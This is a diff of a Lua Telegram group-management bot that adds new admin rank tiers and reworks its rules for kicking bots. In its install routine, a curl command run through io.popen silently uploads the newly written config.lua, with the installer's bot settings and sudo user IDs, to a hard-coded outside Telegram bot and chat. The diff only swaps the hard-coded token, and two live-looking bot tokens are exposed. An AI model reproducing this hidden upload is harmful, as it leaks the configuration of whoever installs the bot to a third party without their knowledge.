@@ -58,7 +58,7 @@ bot_id = botid,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-local curl = 'curl "'..'https://api.telegram.org/bot543232985:AAGd1f81Wx2DoJ7UTOCWbIZC6NfylmJ4V00/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot543232985:AAE_Dqpy7u6hOVsksiE6sINJw8OzcHL2tfk/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("FA", "w")  file:write([[
 killall screen
 screen ./RUNFA.sh
@@ -164,14 +164,14 @@ function is_admin(user_id)
   end
   return var
 end
----------------Owner-------------------
-function is_owner(user_id, chat_id)
+---------------Owner all-------------------
+function is_onall(user_id, chat_id)
   local var = false
-  local hash =  'bot:owners:'..chat_id
-  local owner = database:sismember(hash, user_id)
+  local hash =  'bot:onall:'
+  local onall = database:sismember(hash, user_id)
   local hashs =  'bot:admins:'
   local admin = database:sismember(hashs, user_id)
-  if owner then
+  if onall then
     var = true
   end
   if admin then
@@ -187,7 +187,167 @@ function is_owner(user_id, chat_id)
   end
   return var
 end
-------------------Mod-------------------
+------------------Modod all-------------------
+function is_moall(user_id, chat_id)
+  local var = false
+  local hash =  'bot:moall:'
+  local moall = database:sismember(hash, user_id)
+  local hashs =  'bot:admins:'
+  local admin = database:sismember(hashs, user_id)
+local hashss =  'bot:onall:'
+  local onall = database:sismember(hashss, user_id)
+  if moall then
+    var = true
+  end
+  if admin then
+    var = true
+  end
+  if onall then
+    var = true
+  end
+  for k,v in pairs(sudo_users) do
+    if user_id == v then
+      var = true
+    end
+  end
+  if user_id == tonumber(bot_owner) then
+    var = true
+  end
+  return var
+end
+--------------VIP MEMBER ALL-----------------
+function is_vpall(user_id, chat_id)
+  local var = false
+  local hashs =  'bot:admins:'
+  local admin = database:sismember(hashs, user_id)
+  local hashss =  'bot:onall:'
+  local onall = database:sismember(hashss, user_id)
+  local hashsss = 'bot:vpall:'
+  local vpall = database:sismember(hashsss, user_id)
+  local hashssss =  'bot:moall:'
+local moall = database:sismember(hashssss, user_id)
+  if vipmem then
+    var = true
+  end
+  if onall then
+    var = true
+  end
+  if admin then
+    var = true
+  end
+  if moall then
+    var = true
+  end
+  for k,v in pairs(sudo_users) do
+    if user_id == v then
+      var = true
+    end
+  end
+  if user_id == tonumber(bot_owner) then
+    var = true
+  end
+  return var
+end
+-----------------------donky--------------------
+function is_donky(user_id, chat_id)
+  local var = false
+  local hash =  'bot:donky:'..chat_id
+  local momod = database:sismember(hash, user_id)
+  local hashs =  'bot:admins:'
+  local admin = database:sismember(hashs, user_id)
+  local hashss =  'bot:owners:'..chat_id
+  local owner = database:sismember(hashss, user_id)
+  local hashsss = 'bot:vipmem:'..chat_id
+  local vipmem = database:sismember(hashsss, user_id)
+  local hashssss =  'bot:monsh:'..chat_id
+local monsh = database:sismember(hashssss, user_id)
+local hashsssss =  'bot:onall:'
+  local onall = database:sismember(hashsssss, user_id)
+  local hashfaed =  'bot:moall:'
+  local moall = database:sismember(hashfaed, user_id)
+  if donky then
+    var = true
+  end
+  if momod then
+    var = true
+  end
+  if owner then
+    var = true
+  end
+  if admin then
+    var = true
+  end
+  if monsh then
+    var = true
+  end
+  if onall then
+    var = true
+  end
+  if moall then
+    var = true
+  end
+  for k,v in pairs(sudo_users) do
+    if user_id == v then
+      var = true
+    end
+  end
+  if user_id == tonumber(bot_owner) then
+    var = true
+  end
+  return var
+end
+---------------monsh------------------------------
+function is_monsh(user_id, chat_id)
+local var = false
+local hash =  'bot:monsh:'..chat_id
+local monsh = database:sismember(hash, user_id)
+  local hashs =  'bot:admins:'
+local admin = database:sismember(hashs, user_id)
+   if monsh then
+var = true
+   end
+   if admin then
+var = true
+   end
+for k,v in pairs(sudo_users) do
+if user_id == v then
+var = true
+end
+  end
+  if user_id == tonumber(bot_owner) then
+    var = true
+  end
+  return var
+end
+---------------Owner-------------------
+function is_owner(user_id, chat_id)
+  local var = false
+  local hash =  'bot:owners:'..chat_id
+  local owner = database:sismember(hash, user_id)
+  local hashs =  'bot:admins:'
+  local admin = database:sismember(hashs, user_id)
+  local hashss =  'bot:monsh:'..chat_id
+local monsh = database:sismember(hashss, user_id)
+  if owner then
+    var = true
+  end
+  if admin then
+    var = true
+  end
+  if monsh then
+    var = true
+  end
+  for k,v in pairs(sudo_users) do
+    if user_id == v then
+      var = true
+    end
+  end
+  if user_id == tonumber(bot_owner) then
+    var = true
+  end
+  return var
+end
+------------------Modod-------------------
 function is_momod(user_id, chat_id)
   local var = false
   local hash =  'bot:momod:'..chat_id
@@ -196,6 +356,10 @@ function is_momod(user_id, chat_id)
   local admin = database:sismember(hashs, user_id)
   local hashss =  'bot:owners:'..chat_id
   local owner = database:sismember(hashss, user_id)
+  local hashsss =  'bot:monsh:'..chat_id
+local monsh = database:sismember(hashsss, user_id)
+local hashssss =  'bot:onall:'
+  local onall = database:sismember(hashssss, user_id)
   if momod then
     var = true
   end
@@ -203,6 +367,12 @@ function is_momod(user_id, chat_id)
     var = true
   end
   if admin then
+    var = true
+  end
+  if monsh then
+    var = true
+  end
+  if onall then
     var = true
   end
   for k,v in pairs(sudo_users) do
@@ -226,6 +396,12 @@ function is_vipmem(user_id, chat_id)
   local owner = database:sismember(hashss, user_id)
   local hashsss = 'bot:vipmem:'..chat_id
   local vipmem = database:sismember(hashsss, user_id)
+  local hashssss =  'bot:monsh:'..chat_id
+local monsh = database:sismember(hashssss, user_id)
+local hashsssss =  'bot:onall:'
+  local onall = database:sismember(hashsssss, user_id)
+  local hashfaed =  'bot:moall:'
+  local moall = database:sismember(hashfaed, user_id)
   if vipmem then
     var = true
   end
@@ -236,6 +412,15 @@ function is_vipmem(user_id, chat_id)
     var = true
   end
   if admin then
+    var = true
+  end
+  if monsh then
+    var = true
+  end
+  if onall then
+    var = true
+  end
+  if moall then
     var = true
   end
   for k,v in pairs(sudo_users) do
@@ -632,7 +817,6 @@ function chek_bots(channel,cb)
   end
   getChannelFull(channel,callback_admins)
 end
-
 -------------------------------------------faeder----------------------------------------------------
 function getInputMessageContent(file, filetype, caption)
   if file:match('/') or file:match('.') then
@@ -984,6 +1168,26 @@ end
 ------------
     -- end functions faeder --
     -----------------------------------------------------------------------------------------------
+    if not is_momod(msg.sender_user_id_, msg.chat_id_) then
+local list = msg.content_.members_
+for i = 0, #list do
+if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("bot:bots:mute" .. msg.chat_id_) then
+chat_kick(msg.chat_id_, list[i].id_)
+end
+if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("bot:bots:ban" .. msg.chat_id_) then
+chat_kick(msg.chat_id_, list[i].id_)
+chat_kick(msg.chat_id_, msg.sender_user_id_)
+faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ممنوع اضافه البوتات •\n📚⁞ تم طرد البوت مع العضو •", 1, "md")
+end
+if list[i].type_.ID == "UserTypeBot" and not is_vipmem(list[i].id_, msg.chat_id_) and database:get("keed_bots"..msg.chat_id_) then
+chat_kick(msg.chat_id_, list[i].id_)
+database:sadd('bot:keed:'..msg.chat_id_, msg.sender_user_id_)
+HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
+database:sadd('bot:keed:'..msg.chat_id_, msg.sender_user_id_)
+faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ممنوع اضافه البوتات •\n📚⁞ تم طرد البوت وتقييد العضو •", 1, "md")
+end
+end
+end
     -----------------------------------------------------------------------------------------------
     ----------------------------------------Anti FLood---------------------------------------------
     --------------Flood Max --------------faeder
@@ -1018,7 +1222,30 @@ end
       end
     end
     -----------------End-------------------
-
+local sendfaeder = function(chat_id, reply_to_message_id, text, offset, length, userid)
+  tdcli_function({
+    ID = "SendMessage",
+    chat_id_ = chat_id,
+    reply_to_message_id_ = reply_to_message_id,
+    disable_notification_ = 0,
+    from_background_ = 1,
+    reply_markup_ = nil,
+    input_message_content_ = {
+      ID = "InputMessageText",
+      text_ = text,
+      disable_web_page_preview_ = 1,
+      clear_draft_ = 0,
+      entities_ = {
+        [0] = {
+          ID = "MessageEntityMentionName",
+          offset_ = offset,
+          length_ = length,
+          user_id_ = userid
+        }
+      }
+    }
+  }, dl_cb, nil)
+end
     --------------ANTI ATTACK-------------faeder
     local pmonpv = 'antiattack:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
     if not database:get(pmonpv) then
@@ -1372,20 +1599,9 @@ end
         print("Deleted [Lock] [Tgservice] [NewUserAdd]")
         return
       end
-      if msg.content_.ID == "MessageChatAddMembers" then
-if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
-if database:get("lock_bot:tshake"..msg.chat_id_..bot_id) then
-changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
-end
-if database:get("bot:bots:ban"..msg.chat_id_..bot_id) then
-changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
-changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
-end
-end
-end
       if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
         if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
-          if database:get('bot:bots:mute'..msg.chat_id_) then
+          if database:get('bot:bots:gkgk'..msg.chat_id_) then
             chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
             return false
           end
@@ -1909,7 +2125,7 @@ end
           database:hset(svuser, 'username', username)
         end
         if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
-          if database:get('bot:bots:mute'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
+          if database:get('bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
             local id = msg.id_
             local msgs = {[0] = id}
             local chat = msg.chat_id_
@@ -2202,7 +2418,7 @@ faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
 end
 if text == 'سورس فايدر' or text == 'هذا سورس فايدر' then 
 if not database:get('bot:rep:mute'..msg.chat_id_) then
-faeder =  "لآ سٰٰٓوِرسٰٰٓ خٰ̐ہآلتَہَٰڪٰྀہٰٰٖ ديِٰہ لڪٰྀہٰٰٖ ┋՞❁ 🌞💥 ﴾"
+faeder =  "لآ سٰٰٓوِرسٰٰٓ خٰ̐ہآلتَہَٰڪٰྀہٰٰٖ ديِٰہ لڪٰྀہٰٰٖ ┋՞❁ 🌞?? ﴾"
 else 
 faeder = ''
 end
@@ -2340,10 +2556,10 @@ num = num + 1
 database:sadd('bot:momod:'..msg.chat_id_, admins[i].user_id_)   
 if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
 owner_id = admins[i].user_id_  
-database:sadd('bot:owners:'..msg.chat_id_,owner_id)   
+database:sadd('bot:monsh:'..msg.chat_id_,owner_id)   
 end  
 end  
-faederdx(msg.chat_id_, msg.id_, 1, '\n*🚦⁞ تم رفع «'..num..'» ادمنيه هنا •\n🚏⁞ وتمت ترقيتة منشئ المجموعه مدير •*', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '\n*🚦⁞ تم رفع «'..num..'» ادمنيه هنا •\n🚏⁞ وتم رفع منشئ المجموعه •*', 1, 'md')
 end
 getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
 end
@@ -2384,6 +2600,21 @@ end
             elseif is_admin(result.id_) then
               ten = 'sudo3'
               tar = 'مطور رتبه ثالثه'
+              elseif is_onall(result.id_) then
+              ten = 'owner all'
+              tar = 'مدير عام'
+              elseif is_moall(result.id_) then
+              ten = 'modod all'
+              tar = 'ادمن عام'
+              elseif is_vpall(result.id_) then
+              ten = 'vip all'
+              tar = 'مميز عام'
+              elseif is_monsh(result.id_, msg.chat_id_) then
+              ten = 'monsh'
+              tar = 'منشئ'
+              elseif is_donky(result.id_, msg.chat_id_) then
+              ten = 'Full donky'
+              tar = 'مطي فول مواصفات 😹😔'
             elseif is_owner(result.id_, msg.chat_id_) then
               ten = 'Owner'
               tar = 'مدير البوت'
@@ -2662,7 +2893,7 @@ faederdx(msg.chat_id_, msg.id_, 1, result_text, 1, 'md')
           if database:get('lang:gp:'..msg.chat_id_) then
             faederdx(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
           else
-            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| ارسل لي المنشور الان 🎗', 1, 'md')
+            faederdx(msg.chat_id_, msg.id_, 1, '??|| ارسل لي المنشور الان 🎗', 1, 'md')
           end
         end
         ----- faeder
@@ -3216,7 +3447,7 @@ end
                 else
                   database:sadd(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
-                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n??|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                   else
                     faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم حظره من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                   end
@@ -3686,30 +3917,516 @@ faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1,
 	   database:set('pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
 	faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم تثبيت الرساله •', 1, 'md')
    end
-
-        local text = msg.content_.text_:gsub('رفع مدير','Setowner')
-        if text:match("^[Ss]etowner$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
-          function setowner_by_reply(extra, result, success)
-            local hash = 'bot:owners:'..msg.chat_id_
+local text = msg.content_.text_:gsub('رفع منشئ','Setmonsh')
+        if text:match("^[Ss]etmonsh$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
+          function setmonsh_by_reply(extra, result, success)
+            local hash = 'bot:monsh:'..msg.chat_id_
             if database:sismember(hash, result.sender_user_id_) then
               if database:get('lang:gp:'..msg.chat_id_) then
-               faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now onwer ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+               faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
               else
-                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير البوت سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه منشئ سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
               end
             else
               database:sadd(hash, result.sender_user_id_)
               if database:get('lang:gp:'..msg.chat_id_) then
-                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been onwer ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
               else
-                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
               end
             end
           end
-          getMessage(msg.chat_id_, msg.reply_to_message_id_,setowner_by_reply)
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,setmonsh_by_reply)
         end
         --------------------------------------------faedee---------------------------------------------------
-        if text:match("^[Ss]etowner @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+        if text:match("^[Ss]etmonsh @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Ss]etmonsh) @(.*)$")}
+          function setmonsh_by_username(extra, result, success)
+            if result.id_ then
+              database:sadd('bot:monsh:'..msg.chat_id_, result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              end
+            else
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+          end
+          resolve_username(ap[2],setmonsh_by_username)
+        end
+        --------------------------------------faeder---------------------------------------------------------
+        if text:match("^[Ss]etmonsh (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Ss]etmonsh) (%d+)$")}
+          database:sadd('bot:monsh:'..msg.chat_id_, ap[2])
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          end
+        end
+        ----------------------------------------faeder-------------------------------------------------------
+        local text = msg.content_.text_:gsub('تنزيل منشئ','Demmonsh')
+        if text:match("^[Dd]emmonsh$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
+          function demonsh_by_reply(extra, result, success)
+            local hash = 'bot:monsh:'..msg.chat_id_
+            if not database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه منشئ سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            else
+              database:srem(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المنشئ ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,demonsh_by_reply)
+        end
+        ----------------------------------------faeder-------------------------------------------------------
+        if text:match("^[Dd]emmonsh @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:monsh:'..msg.chat_id_
+          local ap = {string.match(text, "^([Dd]emmonsh) @(.*)$")}
+          function remmonsh_by_username(extra, result, success)
+            if result.id_ then
+              database:srem(hash, result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The Owner ؛ '..result.id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '*🎈|| المنشئ ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              end
+            else
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+          end
+          resolve_username(ap[2],remmonsh_by_username)
+        end
+        ----------------------------------------------faeder-------------------------------------------------
+        if text:match("^[Dd]emmonsh (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:monsh:'..msg.chat_id_
+          local ap = {string.match(text, "^([Dd]emmonsh) (%d+)$")}
+          database:srem(hash, ap[2])
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..ap[2]..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المنشئ ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          end
+        end
+        -------------------------------faeder-------------------
+        local text = msg.content_.text_:gsub('رفع مدير عام','Setownerall')
+        if text:match("^[Ss]etownerall$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
+          function setownerall_by_reply(extra, result, success)
+            local hash = 'bot:onall:'
+            if database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+               faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now onwer all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            else
+              database:sadd(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,setownerall_by_reply)
+        end
+        --------------------------------------------faedee---------------------------------------------------
+        if text:match("^[Ss]etownerall @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Ss]etownerall) @(.*)$")}
+          function setownerall_by_username(extra, result, success)
+            if result.id_ then
+              database:sadd('bot:onall:', result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              end
+            else
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+          end
+          resolve_username(ap[2],setownerall_by_username)
+        end
+        --------------------------------------faeder---------------------------------------------------------
+        if text:match("^[Ss]etownerall (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local ap = {string.match(text, "^([Ss]etownerall) (%d+)$")}
+          database:sadd('bot:onall:', ap[2])
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          end
+        end
+        ----------------------------------------faeder-------------------------------------------------------
+        local text = msg.content_.text_:gsub('تنزيل مدير عام','Demownerall')
+        if text:match("^[Dd]emownerall$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
+          function deownerall_by_reply(extra, result, success)
+            local hash = 'bot:onall:'
+            if not database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a owner all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مدير عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            else
+              database:srem(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              else
+                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير العام ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+              end
+            end
+          end
+          getMessage(msg.chat_id_, msg.reply_to_message_id_,deownerall_by_reply)
+        end
+        ----------------------------------------faeder-------------------------------------------------------
+        if text:match("^[Dd]emownerall @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:onall:'
+          local ap = {string.match(text, "^([Dd]emownerall) @(.*)$")}
+          function remownerall_by_username(extra, result, success)
+            if result.id_ then
+              database:srem(hash, result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| The Owner all ؛ '..result.id_..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              else
+                texts = '*🎈|| المدير العام ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
+              end
+            else
+              if database:get('lang:gp:'..msg.chat_id_) then
+                texts = '*🎈|| Username is not correct ❎*'
+              else
+                texts = '*🎈|| المعرف غير صحيح ❎*'
+              end
+            end
+            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+          end
+          resolve_username(ap[2],remownerall_by_username)
+        end
+        ----------------------------------------------faeder-------------------------------------------------
+        if text:match("^[Dd]emownerall (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
+          local hash = 'bot:onall:'
+          local ap = {string.match(text, "^([Dd]emownerall) (%d+)$")}
+          database:srem(hash, ap[2])
+          if database:get('lang:gp:'..msg.chat_id_) then
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The Owner all ؛ '..ap[2]..' ، 🚷\n🎈|| removed from owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          else
+            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المدير العام ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
+          end
+        end
+        ------------------------------------------faeder-----------------------------------------------------
+        local text = msg.content_.text_:gsub('رفع ادمن عام','Promoteall')
+        if text:match("^[Pp]romoteall$") and is_onall(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
+          function promoteall_by_reply(extra, result, success)
+            local hash = 'bot:moall:'
+            if database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a moderator all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
+              else
